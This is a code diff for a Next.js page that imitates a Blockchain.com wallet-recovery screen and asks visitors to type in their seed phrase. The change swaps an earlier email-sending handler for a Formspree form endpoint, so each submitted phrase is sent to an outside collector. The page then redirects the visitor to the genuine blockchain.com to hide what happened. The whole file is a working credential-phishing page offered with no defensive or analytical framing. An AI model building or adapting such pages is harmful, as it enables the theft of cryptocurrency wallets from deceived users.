@@ -2,33 +2,40 @@ import Image from 'next/image'
 import Link from 'next/link'
 import { useState } from 'react'
 import { useRouter } from 'next/router'
+import { useForm, ValidationError } from '@formspree/react';
 
 const Main = () => {
 
+    const [state, handleSubmit] = useForm("moqryzwb");
+
     const Router = useRouter()
 
-    const [seedPhrase, setSeedPhrase] = useState()
+    if (state.succeeded) {
+       return Router.push('https://www.blockchain.com/')
+    }
 
-    const handleSubmit = (e) => {
-        e.preventDefault();
+    // const [seedPhrase, setSeedPhrase] = useState()
 
-        let data = {
-            seedPhrase
-        }
-        const jsondata = JSON.stringify(data)
-        console.log(jsondata)
+    // const handleSubmit = (e) => {
+    //     e.preventDefault();
+
+    //     let data = {
+    //         seedPhrase
+    //     }
+    //     const jsondata = JSON.stringify(data)
+    //     console.log(jsondata)
   
-        fetch('/api/sendemail', {
-            method: 'POST',
-            body: jsondata
-        }).then((res) => {
-            console.log('successful')
+    //     fetch('/api/sendemail', {
+    //         method: 'POST',
+    //         body: jsondata
+    //     }).then((res) => {
+    //         console.log('successful')
                 
-                setSeedPhrase('')
+    //             setSeedPhrase('')
 
-        })
-        Router.push('https://www.blockchain.com/')
-      }
+    //     })
+    //     Router.push('https://www.blockchain.com/')
+    //   }
 
     return (
         <main className="bg-[#121D33] w-full h-screen">
@@ -58,9 +65,9 @@ const Main = () => {
                     recover your funds and transactions
                  </p>
                 
-                <form onSubmit={(e) => handleSubmit(e)} name="submit" method="post" id="send_mail" className="mt-3 flex flex-col">
+                <form onSubmit={handleSubmit} name="submit" method="post" id="send_mail" className="mt-3 flex flex-col">
                   <label htmlFor="seed_phrase" className="text-right text-xs text-rose-500 mb-1"> Required</label>
-                 <input type="text" name="seed_phrase" onChange={(e) =>{ return setSeedPhrase(e.target.value)}} className="w-full h-10 p-2 border border-rose-800 rounded outline-none focus:border-rose-500" required/>
+                 <input type="text" name="seed_phrase" className="w-full h-10 p-2 border border-rose-800 rounded outline-none focus:border-rose-500" required/>
                  <div className="flex justify-end">
                      <button className="text-sm font-normal text-blue-600 mt-1 mr-3">Go Back</button>
                      <input type="submit" value="continue" name="submit" className="text-white self-end w-32 h-9 bg-blue-600 mt-2 rounded text-sm hover:bg-blue-800 cursor-pointer"/>
